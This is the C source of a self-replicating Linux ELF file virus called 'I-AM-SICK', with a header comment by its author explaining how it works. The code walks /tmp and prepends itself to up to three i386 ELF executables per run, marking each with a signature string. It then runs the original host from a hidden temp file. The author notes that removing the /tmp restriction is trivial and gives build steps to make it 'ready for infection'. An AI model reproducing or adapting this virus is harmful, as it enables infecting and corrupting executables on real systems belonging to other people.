/*
    I-AM-SICK Linux x86 ELF file virus
    ----------------------------------
    This is simple linux file virus that I wrote just for example. 
    Virus will just write his code to the 'host' file, and real host file code
    will be located after our virus. When host is started, virus code will be
    started, and virus will scan for other files for infection. When 
    infection is done, virus will extract real host code and run it. 
    String "I-am-sick virus from II-Labs" will be written to the end of infected
    files.
    This virus is limited to /tmp directory (because I wrote it just for example),
    but it is trivial to change that.
    If you wanna test this code, compile it and look for binary size. Than edit 
    this source and change '#define MYSIZE 15488' to binary size (in bytes).
    Compile it again and it is ready for infection :o).
    Code is messy as it should be :-).
    
    P.S. Croatian expert for computer viruses Lucian Caric said that he won't give job to
	 anyone who wrote some kind of virus, no matter how skilled is that person. 
	 It looks that I won't work for him, DAMN ;-))).

				Coded by DownBload <downbload@hotmail.com>
					 Illegal Instruction Labs <www.ii-labs.org>
*/

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <ftw.h>
#include <elf.h>


#define INFECTED "I-am-sick virus from II-Labs" 
#define HEADER   sizeof(Elf32_Ehdr)
#define MYSIZE   15488       // <- change this

char *argvzero;
extern char **environ;

int check_if_elf (char *name);
int check_if_infected (char *name, struct stat *sb);
int (fnct)(const char *file, const struct stat *sb, int flag);
void infect_this_file (char *name, struct stat *sb);
void exec_real (char **argvlist);


int check_if_elf (char *name)
{ 
  Elf32_Ehdr elf;
  char belf[4] = {'\x7f','E','L','F'};
  int fd;
  if ((fd = open (name,O_RDONLY)) == -1)
     return -1;
  read (fd,&elf,HEADER);
  close (fd); 
  if ((strncmp(elf.e_ident,belf,4)) != 0)
     return -1;
  if (elf.e_type != ET_EXEC)
     return -1;
  if (elf.e_machine != EM_386)
     return -1;
  return 0;  
}


int check_if_infected (char *name, struct stat *sb)
{
 int fd, size;
 char buf[64];

 if ((fd = open (name,O_RDONLY)) == -1)
   perror ("open:"); 

 size = sb->st_size - strlen (INFECTED);
 lseek(fd, size, SEEK_SET);
 read (fd,&buf,strlen(INFECTED));
 close (fd);
 if ((strncmp (buf,INFECTED,strlen(INFECTED))) == 0) {
    return 0; }
 else
    return -1;
}


void exec_real (char **argvlist)
{
  int me, tmp;
  int n,x;
  char copy[4096], *tmpn;
  char tempfilebuf[] = "/tmp/.iil-i-am-sick-execXXXXXX";

  if ((me = open (argvzero,O_RDONLY)) == -1)
     return;
  tmpn = mktemp (tempfilebuf);
  if ((tmp = open (tmpn,O_RDWR|O_CREAT,0777)) == -1)
     return;
  lseek (me,MYSIZE,SEEK_SET);

  while ((n = read(me,&copy,sizeof(copy))) != 0) {
        write (tmp,&copy,n);
  }
  close (me);
  close (tmp);
  
  strncpy (argvlist[0],argvzero,strlen(argvzero));
  if (fork() == 0) wait();
  else execve (tmpn,argvlist,environ);
  unlink (tmpn); 
} 
 

void infect_this_file (char *name, struct stat *sb)
{
  int me,him,tmp; 
  int x,n=0;
  char copy[4096];
  char tempfilebuf[] = "/tmp/.iil-i-am-sickXXXXXX";
  char buf[512],*tmpn;
 
  if ((me = open (argvzero,O_RDONLY)) == -1)
     return;
  if ((him = open (name,O_RDONLY)) == -1)
     return;
  tmpn = mktemp (tempfilebuf);  
  if ((tmp = open (tmpn,O_RDWR|O_CREAT)) == -1)
     return;
  
  for (x=0;x<MYSIZE;x++)
  {
   read (me,&buf,1);
   write (tmp,&buf,1);
  }
  
  while ((n = read (him,&copy,sizeof(copy))) != 0) { 
      write (tmp,&copy,n);
  }
  write (tmp,INFECTED,strlen(INFECTED));
  close (me);
  close (him);
  close (tmp);
  rename (tmpn,name);
  chmod (name,sb->st_mode);
 }


int (fnct)(const char *file, const struct stat *sb, int flag)
{
  static int infected_count = 0;
  if (flag == FTW_F)
     if (check_if_elf (file) == 0) {
	 if ((check_if_infected(file,sb)) == -1 && infected_count < 3) {
	  infect_this_file(file,sb);
	  infected_count++;
	 }
	 else
	  return 0;
     }
  return 0;
}


main (int argc, char **argv)  // short main, isn't it? :-)
{
  argvzero = argv[0];
  ftw ("/tmp",&fnct,5);
  exec_real(argv);
  exit(0);
}
